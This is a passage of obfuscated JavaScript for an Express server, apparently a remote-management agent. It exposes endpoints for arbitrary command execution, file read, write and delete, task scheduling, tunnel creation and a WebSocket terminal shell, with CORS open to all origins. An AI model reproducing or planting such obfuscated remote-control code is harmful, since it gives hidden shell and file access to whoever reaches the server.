        if (c[fW(0x5a6)](b[fW(0x42a)]))
            c = c['slice'](0x0, -0x4);
        return c || 'sh';
    }
    static [a0aY(0x567)](a) {
        const fX = a0aY, b = {
                'sPGqe': function (c, d) {
                    return c === d;
                },
                'DoOqS': function (c, d) {
                    return c || d;
                },
                'dwUNd': fX(0x42d),
                'jpAMw': fX(0x38e)
            };
        if (b['sPGqe'](process[fX(0x8de)], fX(0x8f5))) {
            const c = a0o['basename'](String(b['DoOqS'](a, '')))[fX(0x216)]();
            return b[fX(0x321)](c, b[fX(0x37c)]) || b['sPGqe'](c, b[fX(0x69b)]);
        }
        return !![];
    }
    [a0aY(0x5f5)](a) {
        const fY = a0aY, b = {
                'QexOS': fY(0x7ee),
                'OwFBC': function (c, d) {
                    return c === d;
                }
            };
        try {
            let c = Buffer[fY(0x4ed)](JSON['stringify']({
                'type': b[fY(0x5fb)],
                'shell': a0aT[fY(0x495)](a),
                'path': a,
                'incognito': !!(this[fY(0x243)] && a0aT['incognitoNativeApplied'](a))
            }));
            this['useNoise'] && this[fY(0x597)] && this[fY(0x597)]['handshakeFinished'] && (c = this['cipher'][fY(0x430)](c)), this[fY(0x34d)] && b[fY(0x74f)](this[fY(0x34d)][fY(0x48a)], 0x1) && this[fY(0x34d)]['send'](c);
        } catch (d) {
        }
    }
    [a0aY(0x24b)](a) {
        const fZ = a0aY, b = {
                'KfuNt': fZ(0x5a2),
                'gfyuY': function (c, d) {
                    return c === d;
                },
                'vAJIO': fZ(0x5a1),
                'DfjzQ': 'resize',
                'ipSix': fZ(0x555),
                'VBCsZ': function (c, d) {
                    return c !== d;
                },
                'MecNB': fZ(0x2dd)
            };
        if (!this[fZ(0x429)])
            return;
        try {
            const c = Buffer[fZ(0x4ed)](a);
            let d;
            this['useNoise'] ? d = this['cipher'][fZ(0x6db)](c) : d = c;
            let f = ![], g = d[fZ(0x248)](b['KfuNt']);
            if (g['trim']()[fZ(0x456)]('{'))
                try {
                    const h = JSON[fZ(0x57a)](g);
                    f = !![];
                    if (b['gfyuY'](h[fZ(0x7e0)], b[fZ(0x234)])) {
                        let i = Buffer['from'](JSON[fZ(0x852)]({ 'type': b['vAJIO'] }));
                        if (this[fZ(0x7e1)])
                            i = this['cipher'][fZ(0x430)](i);
                        this[fZ(0x34d)][fZ(0x2ae)](i);
                        return;
                    }
                    if (b[fZ(0x32b)](h[fZ(0x7e0)], b[fZ(0x246)])) {
                        this[fZ(0x429)][fZ(0x838)](h[fZ(0x369)] || 0x50, h[fZ(0x8ff)] || 0x18);
                        return;
                    }
                    if (b[fZ(0x32b)](h[fZ(0x7e0)], b[fZ(0x65f)]) && b[fZ(0x2da)](h[fZ(0x37d)], undefined)) {
                        let j = b[fZ(0x32b)](h[fZ(0x2f4)], b[fZ(0x958)]) ? Buffer['from'](h['data'], b['MecNB'])[fZ(0x248)](fZ(0x5a2)) : h[fZ(0x37d)];
                        this['ptyProcess'][fZ(0x4ec)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[fZ(0x429)]['write'](d[fZ(0x248)](b[fZ(0x985)]));
        } catch (l) {
            a0D[fZ(0x8e1)](fZ(0x38d) + this[fZ(0x4aa)] + fZ(0x755) + l[fZ(0x842)]);
            if (this[fZ(0x7e1)])
                this[fZ(0x913)]();
        }
    }
}
async function a0aU() {
    const g0 = a0aY, a = await import(g0(0x208));
    a0A = a['p256'];
    const b = await import('@noble/curves/secp256k1.js');
    a0B = b[g0(0x5a8)];
}
async function a0aV(a = {}) {
    const g1 = a0aY, b = {
            'Gypxc': g1(0x482),
            'momur': function (c, d) {
                return c === d;
            },
            'XRNSn': g1(0x3ce),
            'bKxCe': g1(0x73e),
            'Pbucr': function (c) {
                return c();
            },
            'locGw': g1(0x6f9),
            'ILpJi': g1(0x90c),
            'poJdN': g1(0x384),
            'vDekm': 'Access-Control-Allow-Headers',
            'uPBKt': g1(0x30b),
            'FwzFK': function (c, d) {
                return c / d;
            },
            'Ldouo': '🔄\x20[Cache]\x20BaseInfo\x20缓存已过期，已重新调度系统资源进行更新。',
            'sDupS': function (c, d) {
                return c > d;
            },
            'Ifuvm': function (c, d) {
                return c - d;
            },
            'QaWnD': function (c, d) {
                return c === d;
            },
            'Oirlg': function (c, d, f) {
                return c(d, f);
            },
            'cWWrb': g1(0x709),
            'PviPO': function (c, d) {
                return c === d;
            },
            'ZJLNa': g1(0x649),
            'xgzmK': function (c, d) {
                return c === d;
            },
            'VLmxN': g1(0x7fa),
            'lOHHz': function (c, d) {
                return c(d);
            },
            'WDJoX': function (c, d) {
                return c(d);
            },
            'buUPV': function (c, d) {
                return c === d;
            },
            'NmPxM': function (c, d) {
                return c === d;
            },
            'HdHKD': g1(0x461),
            'KcRQZ': g1(0x471),
            'KkFNf': g1(0x307),
            'CdlLe': 'error',
            'CxykV': function (c, d) {
                return c === d;
            },
            'ijSrE': g1(0x58d),
            'reAou': g1(0x224),
            'MaDXM': function (c, d) {
                return c === d;
            },
            'VYque': g1(0x56b),
            'AUevn': g1(0x7d7),
            'OrjcK': g1(0x348),
            'Hsmuu': g1(0x7bc),
            'CfUqg': function (c, d) {
                return c(d);
            },
            'nyUoh': 'Invalid\x20binary\x20stream\x20request\x20body',
            'KhmIX': 'x-file-size',
            'DdUZD': g1(0x90f),
            'zJDSB': g1(0x84c),
            'GnOHP': g1(0x659),
            'geyvO': g1(0x896),
            'Dhogu': function (c, d) {
                return c !== d;
            },
            'dBdwO': function (c, d, f) {
                return c(d, f);
            },
            'ykXNk': function (c, d) {
                return c === d;
            },
            'lfRdg': function (c, d) {
                return c === d;
            },
            'Tmmxs': function (c, d) {
                return c(d);
            },
            'YbMHk': function (c, d) {
                return c < d;
            },
            'TMjFd': function (c, d) {
                return c > d;
            },
            'omWJC': 'port\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535',
            'KddrF': function (c, d) {
                return c < d;
            },
            'yqiZi': function (c, d) {
                return c > d;
            },
            'JIWnn': function (c, d) {
                return c ?? d;
            },
            'pkieJ': g1(0x26c),
            'nXcTs': function (c, d) {
                return c === d;
            },
            'dtQpa': g1(0x7df),
            'rsKUi': g1(0x3ad),
            'EPJgY': function (c, d) {
                return c(d);
            },
            'YOKvO': 'utf-8',
            'ActTe': g1(0x835),
            'tfaWC': g1(0x417),
            'HKwgr': function (c, d) {
                return c === d;
            },
            'HejMc': function (c, d) {
                return c === d;
            },
            'alfzz': g1(0x72a),
            'BtRhI': function (c) {
                return c();
            },
            'WQPFj': g1(0x96e),
            'OzpKv': g1(0x3d5),
            'BneUD': g1(0x640),
            'kiDqp': g1(0x8f9),
            'RlXqf': g1(0x56d),
            'qzRLk': g1(0x7b7),
            'EzohK': g1(0x729),
            'tQnzj': g1(0x1f6),
            'zGMBq': g1(0x76a),
            'aHzfb': 'Creating\x20Express\x20app...',
            'mqOlG': function (c, d) {
                return c(d);
            },
            'RFYdH': g1(0x4d8),
            'sKobr': g1(0x55d),
            'OMVdk': g1(0x89a),
            'cXJGI': g1(0x52f),
            'oLUKU': '/api/tempkey',
            'JCwhz': g1(0x86a),
            'UMWYZ': g1(0x24f),
            'PKohw': g1(0x8eb),
            'aumem': '/api/run',
            'nEdTs': g1(0x974),
            'xsLzy': '/api/file/list',
            'nImZa': g1(0x27d),
            'XIKMx': g1(0x76c),
            'rgxNd': g1(0x24e),
            'IHAun': g1(0x6a3),
            'DvGuc': '/api/file/cp',
            'LOtvA': g1(0x6af),
            'MRJwi': g1(0x297),
            'NBeDA': '/api/task/onetime',
            'ioksB': g1(0x570),
            'zMRxr': '/api/task/status',
            'suSmH': '/api/task/log/cron',
            'iuECl': '/api/task/log/onetime',
            'XyfoS': g1(0x41e),
            'PXNSE': g1(0x33b),
            'iIAfr': g1(0x894),
            'jbIsA': g1(0x34f),
            'BdpNa': g1(0x204),
            'XeHsY': g1(0x419)
        };
    try {
        await b[g1(0x598)](a0aU), a0D[g1(0x761)](b[g1(0x60c)]), a0P[g1(0x23b)](a), a0D[g1(0x761)](g1(0x979)), a0P['validate'](), a0D[g1(0x761)](b['OzpKv']), a0D[g1(0x761)](b[g1(0x2d5)]);
        const c = new a0R(a0P['ECDSA_PUBLIC_KEY_PEM'], a0P['ECIES_PUBLIC_KEY_PEM']);
        a0D[g1(0x761)](g1(0x608));
        !a0P['DEBUG'] && !c[g1(0x24d)] && (a0D[g1(0x993)](b['kiDqp']), a0D[g1(0x993)](b[g1(0x21c)]), process[g1(0x3c2)](0x1));
        a0D[g1(0x761)](b['qzRLk']);
        const d = new a0Q();
        d[g1(0x954)] = () => a0P[g1(0x4c3)](), a0D[g1(0x761)](b[g1(0x738)]), a0D['debug'](b[g1(0x65a)]);
        const f = new a0U();
        a0D['debug'](b[g1(0x390)]), a0D[g1(0x761)](b[g1(0x5c1)]);
        const g = a0f();
        b[g1(0x45e)](a0x, g), a0D[g1(0x761)](b[g1(0x617)]), g['use']((l, m, n) => {
            const g2 = g1, o = b[g2(0x262)][g2(0x946)]('|');
            let p = 0x0;
            while (!![]) {
                switch (o[p++]) {
                case '0':
                    m[g2(0x7f7)](g2(0x3d3), '*');
                    continue;
                case '1':
                    if (b[g2(0x809)](l[g2(0x75b)], b[g2(0x23a)]))
                        return a0P['DEBUG'] && m[g2(0x336)](b[g2(0x3cb)], g2(0x906)), m[g2(0x62d)](0xc8)[g2(0x53f)]();
                    continue;
                case '2':
                    b[g2(0x2a4)](n);
                    continue;
                case '3':
                    m[g2(0x7f7)](b[g2(0x3b9)], b[g2(0x70e)]);
                    continue;
                case '4':
                    m['header'](b[g2(0x4fd)], g2(0x553));
                    continue;
                case '5':
                    m[g2(0x7f7)](b[g2(0x544)], b[g2(0x473)]);
                    continue;
                }
                break;
            }
        }), g[g1(0x651)](a0f[g1(0x26d)]({
            'type': l => l[g1(0x7eb)] !== g1(0x24e),
            'limit': b[g1(0x70d)]
        })), g[g1(0x651)](a0f['urlencoded']({ 'extended': !![] })), g[g1(0x651)](a0T(c, d)), a0D[g1(0x761)](b[g1(0x5db)]), g[g1(0x47b)](b[g1(0x38a)], async (l, m) => {
            const g4 = g1, n = {
                    'efijH': function (o, p) {
                        const g3 = a0b;
                        return b[g3(0x6d3)](o, p);
                    },
                    'yXMmF': b['Ldouo']
                };
            try {
                const o = Math['floor'](b['FwzFK'](Date[g4(0x2a9)](), 0x3e8));
                !a0P[g4(0x37f)] || b[g4(0x4a5)](b['Ifuvm'](o, a0P[g4(0x895)]), a0P[g4(0x2b2)]) ? (!a0P[g4(0x8ec)] && (a0P[g4(0x8ec)] = f[g4(0x789)]()[g4(0x68b)](q => {
                    const g5 = g4;
                    return a0P[g5(0x37f)] = q, a0P[g5(0x895)] = Math[g5(0x59f)](n[g5(0x650)](Date['now'](), 0x3e8)), a0P[g5(0x8ec)] = null, a0D[g5(0x761)](n[g5(0x4f4)]), q;
                })[g4(0x7a8)](q => {
                    const g6 = g4;
                    a0P[g6(0x8ec)] = null;
                    throw q;
                })), await a0P[g4(0x8ec)]) : a0D[g4(0x761)](g4(0x315));
                const p = { ...a0P[g4(0x37f)] };
                b[g4(0x809)](l[g4(0x35b)], !![]) ? (p['session_key'] = a0P['SESSION_KEY'], p[g4(0x320)] = a0P[g4(0x952)]) : (p['session_key'] = null, p[g4(0x320)] = null), m['json'](p), b[g4(0x420)](a0P[g4(0x646)], '1') && a0aN['onBaseinfoSuccess']();
            } catch (q) {
                m[g4(0x62d)](0x1f4)['json']({
                    'status': g4(0x993),
                    'message': q[g4(0x842)]
                });
            }
        }), g[g1(0x47b)](b[g1(0x8e6)], (l, m) => {
            const g7 = g1;
            let n = a0P['TEMPKEY_DEFAULT_TTL_HOURS'];
            if (l['query']['ttl'] !== undefined) {
                const s = b['Oirlg'](parseInt, l[g7(0x4cc)][g7(0x3b8)], 0xa);
                if (Number[g7(0x638)](s) || s < 0x1 || b['sDupS'](s, a0P[g7(0x270)]))
                    return m[g7(0x62d)](0x1a6)[g7(0x881)]({ 'error': 'ttl\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x20' + a0P[g7(0x270)] });
                n = s;
            }
            const o = b[g7(0x420)](typeof l[g7(0x4cc)][g7(0x22b)], b[g7(0x4d3)]) ? l[g7(0x4cc)][g7(0x22b)][g7(0x7b0)]()[g7(0x216)]() : '';
            let p;
            if (b['PviPO'](o, '') || b[g7(0x809)](o, b[g7(0x955)]))
                p = g7(0x649);
            else {
                if (b['xgzmK'](o, b[g7(0x73f)]))
                    p = b['VLmxN'];
                else
                    return m[g7(0x62d)](0x1a6)['json']({ 'error': 'format\x20must\x20be\x20\x27full\x27\x20or\x20\x27short\x27' });
            }
            const q = d[g7(0x510)](n), r = u => new Date(u * 0x3e8)[g7(0x613)]()['replace'](g7(0x7a3), 'Z');
            m['json']({
                'status': 'ok',
                'key_id': q[g7(0x862)],
                'ttl_seconds': q[g7(0x671)],
                'created_at': b[g7(0x5fe)](r, q[g7(0x287)]),
                'expires_at': b['WDJoX'](r, q[g7(0x20f)]),
                'ecdsa': b[g7(0x8db)](p, b['VLmxN']) ? {
                    'private_key': q[g7(0x507)],
                    'public_key': q[g7(0x54e)]
                } : {
                    'private_key': q['ecdsa_private_key'][g7(0x7b0)](),
                    'public_key': q[g7(0x6b1)][g7(0x7b0)]()
                },
                'ecies': b['NmPxM'](p, g7(0x7fa)) ? {
                    'private_key': q[g7(0x994)],
                    'public_key': q['ecies_public_b64']
                } : {
                    'private_key': q[g7(0x994)],
                    'public_key': q['ecies_public_key']
                }
            });
        }), g[g1(0x47b)](b['JCwhz'], async (l, m) => {
            const g9 = g1, n = {
                    'xCgmS': b['HdHKD'],
                    'ZHnxG': function (o, p) {
                        const g8 = a0b;
                        return b[g8(0x6d3)](o, p);
                    },
                    'GYiIq': b[g9(0x361)]
                };
            try {
                const o = Math[g9(0x59f)](Date[g9(0x2a9)]() / 0x3e8);
                !a0P[g9(0x726)] || b[g9(0x86b)](o, a0P['_status_cache_time']) > a0P['STATUS_CACHE_TTL'] ? (!a0P[g9(0x85f)] && (a0P[g9(0x85f)] = f['getRealtimeInfo']()['then'](q => {
                    const ga = g9, r = n[ga(0x988)]['split']('|');
                    let s = 0x0;
                    while (!![]) {
                        switch (r[s++]) {
                        case '0':
                            a0P[ga(0x54f)] = Math[ga(0x59f)](n[ga(0x93b)](Date[ga(0x2a9)](), 0x3e8));
                            continue;
                        case '1':
                            a0P['_status_fetch_promise'] = null;
                            continue;
                        case '2':
                            a0P[ga(0x726)] = q;
                            continue;
                        case '3':
                            a0D['debug'](n[ga(0x4f0)]);
                            continue;
                        case '4':
                            return q;
                        }
                        break;
                    }
                })[g9(0x7a8)](q => {
                    const gb = g9;
                    a0P[gb(0x85f)] = null;
                    throw q;
                })), await a0P[g9(0x85f)]) : a0D[g9(0x761)](b[g9(0x3b4)]);
                const p = { ...a0P['_status_cache'] };
                m[g9(0x881)](p);
            } catch (q) {
                m[g9(0x62d)](0x1f4)[g9(0x881)]({
                    'status': b['CdlLe'],
                    'message': q[g9(0x842)]
                });
            }
        });
        const h = async (l, m) => {
            const gc = g1;
            try {
                let n = null;
                if (b['NmPxM'](typeof l[gc(0x379)], gc(0x709)))
                    n = l[gc(0x379)][gc(0x7b0)]();
                else
                    l[gc(0x379)] && b['CxykV'](typeof l[gc(0x379)], b[gc(0x242)]) && (n = l[gc(0x379)]['cmd'] || '');
                if (!n)
                    return m['status'](0x190)[gc(0x881)]({
                        'status': b[gc(0x59d)],
                        'message': b['reAou']
                    });
                const o = await a0V[gc(0x35a)](n, {
                    'cwd': l['body'][gc(0x376)],
                    'env': l[gc(0x379)][gc(0x28e)],
                    'timeout': a0P['Rtimeout']
                });
                m['json'](o);
            } catch (p) {
                m[gc(0x62d)](0x1f4)[gc(0x881)]({
                    'status': b[gc(0x59d)],
                    'message': p[gc(0x842)]
                });
            }
        };
        g['post'](b[g1(0x525)], h);
        for (const l of [
                b['PKohw'],
                b[g1(0x407)],
                b['nEdTs']
            ]) {
            g[g1(0x549)](l, h);
        }
        g[g1(0x549)](b[g1(0x476)], async (m, n) => {
            const gd = g1;
            try {
                const o = await a0Y['listFiles'](m['body']['path'], m['body'][gd(0x200)]);
                n[gd(0x881)]({
                    'status': 'ok',
                    'count': o[gd(0x7f5)],
                    'files': o
                });
            } catch (p) {
                n[gd(0x62d)](0x1f4)['json']({
                    'status': b[gd(0x59d)],
                    'message': p[gd(0x842)]
                });
            }
        }), g[g1(0x549)](g1(0x27d), async (m, n) => {
            const ge = g1;
            try {
                const o = await a0Y[ge(0x207)](m[ge(0x379)]['paths'] || []);
                n['json']({
                    'status': 'ok',
                    'files': o
                });
            } catch (p) {
                n[ge(0x62d)](0x1f4)[ge(0x881)]({
                    'status': b[ge(0x59d)],
                    'message': p[ge(0x842)]
                });
            }
        }), g['put'](b[g1(0x62e)], async (m, n) => {
            const gf = g1;
            try {
                const o = m[gf(0x379)][gf(0x793)] || {}, p = b['MaDXM'](m[gf(0x379)][gf(0x200)], !![]), q = await a0Y[gf(0x6ec)](o, p);
                n['json'](q);
            } catch (r) {
                n[gf(0x62d)](0x1f4)[gf(0x881)]({
                    'status': b['CdlLe'],
                    'message': r[gf(0x842)]
                });
            }
        }), g[g1(0x549)](g1(0x765), async (m, n) => {
            const gg = g1;
            try {
                const o = await a0Y[gg(0x78c)](m[gg(0x379)][gg(0x7eb)]);
                n[gg(0x881)](o);
            } catch (p) {
                n['status'](0x1f4)[gg(0x881)]({
                    'status': b[gg(0x59d)],
                    'message': p['message']
                });
            }
        }), g[g1(0x549)](b[g1(0x8b5)], async (m, n) => {
            const gh = g1;
            try {
                const o = await a0Y[gh(0x4c8)](m[gh(0x379)][gh(0x7eb)], m[gh(0x379)][gh(0x2bf)], m['body'][gh(0x7c3)], m[gh(0x379)][gh(0x912)], m[gh(0x379)][gh(0x48d)]);
                n[gh(0x881)](o);
            } catch (p) {
                n[gh(0x62d)](0x1f4)['json']({
                    'status': b[gh(0x59d)],
                    'message': p[gh(0x842)]
                });
            }
        }), g[g1(0x549)](b[g1(0x51c)], a0f['raw']({
            'type': b[g1(0x95d)],
            'limit': g1(0x55d)
        }), async (m, n) => {
            const gi = g1;
            try {
                const o = decodeURIComponent(m[gi(0x695)][b[gi(0x888)]] || ''), p = b['lOHHz'](decodeURIComponent, m[gi(0x695)][gi(0x4b0)] || ''), q = m[gi(0x695)][b[gi(0x62a)]], r = m[gi(0x695)][b[gi(0x447)]];
                if (!o || !p)
                    return n[gi(0x62d)](0x190)[gi(0x881)]({
                        'status': 'error',
                        'completed': ![],
                        'message': b[gi(0x60f)]
                    });
                const s = q !== undefined ? b[gi(0x971)](parseInt, String(q), 0xa) : null, t = r !== undefined ? b[gi(0x971)](parseInt, b[gi(0x57c)](String, r), 0xa) : null, u = m[gi(0x379)];
                if (!Buffer[gi(0x25e)](u))
                    return n[gi(0x62d)](0x190)[gi(0x881)]({
                        'status': b['CdlLe'],
                        'completed': ![],
                        'message': b[gi(0x6b9)]
                    });
                const v = await a0Y[gi(0x91a)](o, p, u, s, t);
                n['json'](v);
            } catch (w) {
                n[gi(0x62d)](0x1f4)[gi(0x881)]({
                    'status': b[gi(0x59d)],
                    'completed': ![],
                    'message': w[gi(0x842)]
                });
            }
        }), g[g1(0x549)](b[g1(0x74c)], async (m, n) => {
            const gj = g1;
            try {
                const o = await a0Y[gj(0x611)](m[gj(0x379)][gj(0x7eb)]);
                return n[gj(0x336)](b[gj(0x487)], o[gj(0x5ca)]['toString']()), n[gj(0x336)]('x-original-path', o[gj(0x7eb)]), n[gj(0x336)](b[gj(0x995)], b[gj(0x95d)]), n['send'](o[gj(0x7c3)]);
            } catch (p) {
                n[gj(0x62d)](0x1f4)[gj(0x881)]({
                    'status': b[gj(0x59d)],
                    'message': p[gj(0x842)]
                });
            }
        }), g[g1(0x775)](b[g1(0x8b5)], async (m, n) => {
            const gk = g1;
            try {
                let o = m[gk(0x379)][gk(0x316)];
                if (!o || !Array[gk(0x2ad)](o)) {
                    o = [];
                    if (m['body'][gk(0x7eb)])
                        o[gk(0x39c)](m[gk(0x379)][gk(0x7eb)]);
                    if (m[gk(0x379)][gk(0x8ef)])
                        o['push'](m['body']['path2']);
                }
                const p = await a0Y[gk(0x2dc)](o);
                n['json']({
                    'status': 'ok',
                    'results': p
                });
            } catch (q) {
                n[gk(0x62d)](0x1f4)[gk(0x881)]({
                    'status': gk(0x993),
                    'message': q[gk(0x842)]
                });
            }
        }), g[g1(0x462)](b[g1(0x8b5)], async (m, n) => {
            const gl = g1;
            try {
                const o = await a0Y[gl(0x697)](m[gl(0x379)][gl(0x2a8)] || m[gl(0x379)]);
                n[gl(0x881)]({
                    'status': 'ok',
                    'total': o[gl(0x7f5)],
                    'success': o[gl(0x4b3)](p => p[gl(0x62d)] === 'ok')[gl(0x7f5)],
                    'results': o
                });
            } catch (p) {
                n[gl(0x62d)](0x1f4)[gl(0x881)]({
                    'status': 'error',
                    'message': p[gl(0x842)]
                });
            }
        }), g[g1(0x549)](b[g1(0x858)], async (m, n) => {
            const gm = g1;
            try {
                const o = await a0Y[gm(0x972)](m[gm(0x379)]);
                n[gm(0x881)]({
                    'status': 'ok',
                    'total': o[gm(0x7f5)],
                    'success': o['filter'](p => p[gm(0x62d)] === 'ok')[gm(0x7f5)],
                    'results': o
                });
            } catch (p) {
                n[gm(0x62d)](0x1f4)[gm(0x881)]({
                    'status': gm(0x993),
                    'message': p[gm(0x842)]
                });
            }
        }), g[g1(0x549)](b[g1(0x98b)], async (m, n) => {
            const gn = g1;
            try {
                const o = await a0Y[gn(0x7b4)](m[gn(0x379)][gn(0x7eb)]);
                n[gn(0x881)](o);
            } catch (p) {
                n['status'](0x1f4)[gn(0x881)]({
                    'status': b[gn(0x59d)],
                    'message': p[gn(0x842)]
                });
            }
        }), g[g1(0x549)](g1(0x2ce), async (m, n) => {
            const go = g1;
            try {
                const o = m['body'] || {};
                if (!o[go(0x7eb)])
                    return n[go(0x62d)](0x190)['json']({ 'error': b[go(0x467)] });
                if (!Array[go(0x2ad)](o['items']) || b[go(0x60e)](o[go(0x26f)][go(0x7f5)], 0x0))
                    return n['status'](0x190)[go(0x881)]({ 'error': b['geyvO'] });
                const p = await a0Y[go(0x6ac)](o[go(0x7eb)], o['items'], !!o[go(0x87f)]);
                n[go(0x881)](p);
            } catch (q) {
                const r = /Access denied/[go(0x4ef)](q[go(0x842)]) ? 0x193 : 0x190;
                n[go(0x62d)](r)[go(0x881)]({
                    'status': b['CdlLe'],
                    'message': q[go(0x842)]
                });
            }
        }), g[g1(0x549)](b[g1(0x5da)], async (m, n) => {
            const gp = g1;
            try {
                const o = m['body'] || {};
                if (!o[gp(0x7eb)])
                    return n[gp(0x62d)](0x190)[gp(0x881)]({ 'error': 'path\x20required' });
                const p = await a0Y[gp(0x3af)](o[gp(0x7eb)], o[gp(0x1ec)], b[gp(0x30e)](o[gp(0x1ea)], ![]), Array['isArray'](o[gp(0x271)]) ? o[gp(0x271)] : null);
                n[gp(0x881)](p);
            } catch (q) {
                const r = /Access denied/['test'](q['message']) ? 0x193 : 0x190;
                n[gp(0x62d)](r)[gp(0x881)]({
                    'status': gp(0x993),
                    'message': q[gp(0x842)]
                });
            }
        }), g[g1(0x47b)](b[g1(0x97b)], (m, n) => {
            const gq = g1;
            n[gq(0x881)](a0a0[gq(0x92b)]());
        }), g[g1(0x549)](b[g1(0x97b)], async (m, n) => {
            const gr = g1;
            try {
                const o = await a0a0[gr(0x7ce)](m[gr(0x379)]);
                n[gr(0x881)](o);
            } catch (p) {
                n[gr(0x62d)](0x1f4)[gr(0x881)]({
                    'status': b[gr(0x59d)],
                    'message': p[gr(0x842)]
                });
            }
        }), g[g1(0x47b)](b[g1(0x497)], (m, n) => {
            const gs = g1;
            n[gs(0x881)](a0a0[gs(0x5ec)]());
        }), g[g1(0x549)](b['ioksB'], (m, n) => {
            const gt = g1;
            try {
                const o = a0a0['setCronTasks'](m[gt(0x379)]);
                n[gt(0x881)](o);
            } catch (p) {
                n[gt(0x62d)](0x1f4)[gt(0x881)]({
                    'status': b[gt(0x59d)],
                    'message': p['message']
                });
            }
        }), g['get'](b[g1(0x26e)], (m, n) => {
            const gu = g1;
            n[gu(0x881)](a0a0[gu(0x317)]());
        }), g[g1(0x47b)](g1(0x2ee), (m, n) => {
            const gv = g1;
            let o = b['Oirlg'](parseInt, m[gv(0x4cc)][gv(0x4ee)], 0xa) || 0x32;
            o = Math[gv(0x29a)](Math[gv(0x253)](o, 0x1), 0x64), n['json'](a0a0[gv(0x90b)](o));
        }), g[g1(0x47b)](b[g1(0x616)], (m, n) => {
            const gw = g1;
            let o = b['dBdwO'](parseInt, m[gw(0x4cc)][gw(0x4ee)], 0xa) || 0x32;
            o = Math[gw(0x29a)](Math['max'](o, 0x1), 0x64), n[gw(0x881)](a0a0[gw(0x77c)](o));
        }), g[g1(0x775)](b[g1(0x88b)], (m, n) => {
            const gx = g1;
            n[gx(0x881)](a0a0['clearOnetimeLogs']());
        }), g['delete'](b[g1(0x616)], (m, n) => {
            const gy = g1;
            n[gy(0x881)](a0a0['clearCronLogs']());
        }), g[g1(0x47b)](b[g1(0x5d2)], (m, n) => {
            const gz = g1;
            n[gz(0x881)](a0a0[gz(0x496)]());
        }), g['post'](b['PXNSE'], async (m, n) => {
            const gA = g1;
            try {
                const o = await a0a0[gA(0x2a2)]();
                n[gA(0x881)](o);
            } catch (p) {
                n['status'](0x1f4)[gA(0x881)]({
                    'status': b['CdlLe'],
                    'message': p[gA(0x842)]
                });
            }
        });
        const i = {
                'debug': (...m) => a0D['debug'](m[g1(0x265)]('\x20')),
                'info': (...m) => a0D[g1(0x8e1)](m[g1(0x265)]('\x20')),
                'warning': (...m) => a0D[g1(0x89f)](m['join']('\x20'))
            }, j = new a0aM(i);
        g['get'](b['iIAfr'], (m, n) => {
            const gB = g1, o = j[gB(0x4a8)]();
            n[gB(0x881)]({
                'status': 'ok',
                'count': o['length'],
                'tunnels': o
            });
        }), g[g1(0x549)](b[g1(0x8ba)], async (m, n) => {
            const gC = g1;
            try {
                const o = a0aL(m[gC(0x379)]);
                let p = o['port'];
                (b[gC(0x340)](p, undefined) || p === null || b[gC(0x2ab)](p, '')) && (p = a0P[gC(0x95b)]);
                const q = b[gC(0x7a6)](Number, p);
                if (!Number[gC(0x2ef)](q) || b[gC(0x2b9)](q, 0x1) || b[gC(0x4dd)](q, 0xffff))
                    return n[gC(0x62d)](0x1a6)[gC(0x881)]({
                        'status': b[gC(0x59d)],
                        'created': ![],
                        'port': p,
                        'message': b[gC(0x28d)]
                    });
                const r = await j['create'](q, b['ykXNk'](o[gC(0x8fd)], !![]));
                n[gC(0x881)]({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': r[gC(0x707)],
                    'port': r['port'],
                    'created_at': r[gC(0x6c6)]
                });
            } catch (s) {
                n['status'](s['status'] || 0x1f4)[gC(0x881)]({
                    'status': b[gC(0x59d)],
                    'created': ![],
                    'port': s[gC(0x1f7)] ?? null,
                    'message': s['message']
                });
            }
        }), g['delete']('/api/argo', async (m, n) => {
            const gD = g1;
            try {
                const o = b[gD(0x7a6)](a0aL, m['body']), p = o['port'], q = b[gD(0x523)](Number, p);
                if (p === undefined || b[gD(0x589)](p, null) || p === '' || !Number[gD(0x2ef)](q) || b[gD(0x284)](q, 0x1) || b['yqiZi'](q, 0xffff))
                    return n[gD(0x62d)](0x1a6)[gD(0x881)]({
                        'status': b[gD(0x59d)],
                        'deleted': 0x0,
                        'port': b[gD(0x45b)](p, null),
                        'message': b['pkieJ']
                    });
                const r = await j['remove'](q, o[gD(0x8f4)]);
                if (r[gD(0x62d)] === 'ok')
                    return n[gD(0x881)]({
                        'status': 'ok',
                        'deleted': r[gD(0x31c)],
                        'port': q,
                        'tunnels': r['tunnels']
                    });
                return n['status'](r[gD(0x62d)])[gD(0x881)]({
                    'status': b['CdlLe'],
                    'deleted': 0x0,
                    'port': q,
                    'message': r[gD(0x842)]
                });
            } catch (s) {
                n[gD(0x62d)](0x1f4)['json']({
                    'status': b['CdlLe'],
                    'deleted': 0x0,
                    'message': s[gD(0x842)]
                });
            }
        }), a0D[g1(0x761)](g1(0x923)), g['ws'](b[g1(0x945)], async (m, n) => {
            const gE = g1, o = n[gE(0x644)][0x0];
            a0D[gE(0x761)]('WebSocket\x20request\x20URL:\x20' + n['url']), a0D[gE(0x761)](gE(0x7dd) + o);
            const p = n[gE(0x4cc)]['request_id'], q = n[gE(0x4cc)][gE(0x6f5)], r = b[gE(0x60e)](n['query'][gE(0x915)], '1'), s = b[gE(0x44e)](n[gE(0x4cc)][gE(0x696)], '1');
            a0D[gE(0x761)]('WebSocket\x20connection\x20attempt\x20with\x20request_id:\x20' + p);
            if (!p) {
                a0D[gE(0x761)](b['dtQpa']), m[gE(0x661)](0x3f0, b[gE(0x5eb)]);
                return;
            }
            if (q) {
                const u = a0P['wsDowngradeToken'](), v = Buffer['from'](b[gE(0x294)](String, q), b[gE(0x41b)]), w = Buffer[gE(0x4ed)](u, gE(0x5a2)), x = v[gE(0x7f5)] === w['length'] && a0k[gE(0x513)](v, w);
                if (!x) {
                    a0D[gE(0x89f)](gE(0x38d) + p + gE(0x460)), m[gE(0x661)](0x3f0, b[gE(0x8ab)]);
                    return;
                }
            }
            const t = new a0aT();
            await t[gE(0x86c)](m, p, q, r, s);
        }), a0D[g1(0x761)](b[g1(0x8d0)]), a0a0['restoreFromStore'](), a0D['debug'](b[g1(0x704)]);
        const k = g[g1(0x1e5)](a0P[g1(0x95b)], a0P[g1(0x83a)], () => {
            const gF = g1;
